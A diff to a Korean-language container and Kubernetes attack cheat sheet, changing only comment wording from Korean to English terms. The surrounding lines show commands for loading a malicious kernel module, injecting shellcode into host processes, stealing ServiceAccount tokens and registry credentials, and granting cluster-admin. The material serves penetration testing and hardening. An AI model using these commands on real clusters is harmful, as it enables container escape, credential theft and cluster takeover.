@@ -75,7 +75,7 @@ docker -H unix:///var/run/docker.sock run -it --rm \
 
 ```bash
 # 악성 커널 모듈 로드 → 호스트 커널에 코드 실행
-# (호스트와 동일 커널 버전으로 빌드 필요)
+# (호스트와 동일 커널 버전으로 build 필요)
 insmod evil.ko
 ```
 
@@ -84,7 +84,7 @@ insmod evil.ko
 ```bash
 # 호스트 PID namespace 공유 시
 ps auxf
-# 호스트 프로세스에 attach → shellcode 인젝션
+# 호스트 프로세스에 attach → shellcode injection
 gdb -p <host_pid>
 ```
 
@@ -124,7 +124,7 @@ amicontained        # https://github.com/genuinetools/amicontained
 env | grep -i kube
 ls /var/run/secrets/kubernetes.io/serviceaccount/
 
-# ServiceAccount 토큰
+# ServiceAccount token
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
@@ -220,13 +220,13 @@ kubectl create clusterrolebinding pwn \
   --clusterrole=cluster-admin --serviceaccount=default:default
 ```
 
-#### 4) `secrets` get → 다른 SA 토큰 탈취
+#### 4) `secrets` get → 다른 SA token 탈취
 
 ```bash
-# legacy SA token (k8s < 1.24) 또는 수동 생성된 토큰
+# legacy SA token (k8s < 1.24) 또는 수동 생성된 token
 kubectl get secrets -A | grep token
 kubectl get secret <token-secret> -n <ns> -o jsonpath='{.data.token}' | base64 -d
-# → 더 높은 권한 SA 의 토큰으로 재인증
+# → 더 높은 권한 SA 의 token으로 재인증
 ```
 
 #### 5) ImagePullSecrets / Helm value 노출
@@ -234,7 +234,7 @@ kubectl get secret <token-secret> -n <ns> -o jsonpath='{.data.token}' | base64 -
 ```bash
 kubectl get secret -A -o yaml | grep -A2 dockerconfigjson
 kubectl get secret <regcred> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d
-# → 사설 레지스트리 자격증명 → 내부 이미지 변조
+# → 사설 레지스트리 credential → 내부 이미지 변조
 ```
 
 ### 자동 점검 도구
@@ -299,7 +299,7 @@ kubectl delete clusterrolebinding pwn
 
 ### Kubelet API (10250) 익명 접근
 
-Kubelet API에 익명 접근(`--anonymous-auth=true`)이 허용되어 있다면, 토큰 없이 팟 내에서 명령어 실행이 가능하다.
+Kubelet API에 익명 접근(`--anonymous-auth=true`)이 허용되어 있다면, token 없이 팟 내에서 명령어 실행이 가능하다.
 
 ```bash
 # Kubelet 포트 확인 (일반적으로 10250, 10255(read-only))
@@ -335,7 +335,7 @@ curl -s http://<registry-ip>:5000/v2/<image-name>/tags/list
 ## RBAC 권한 남용 및 공격
 
 1. **`create pods`**: `hostPath`, `hostPID`, `privileged` 플래그를 활용한 권한 상승 팟 생성
-2. **`list/get secrets`**: K8s 내부 시크릿(다른 SA의 토큰 등) 탈취
+2. **`list/get secrets`**: K8s 내부 시크릿(다른 SA의 token 등) 탈취
 3. **`create/update daemonsets/deployments`**: 워크로드 수정을 통한 악의적 컨테이너 실행
 4. **`bind` (ClusterRoleBinding / RoleBinding)**: 기존 SA에 클러스터 관리자 권한 부여
    ```bash
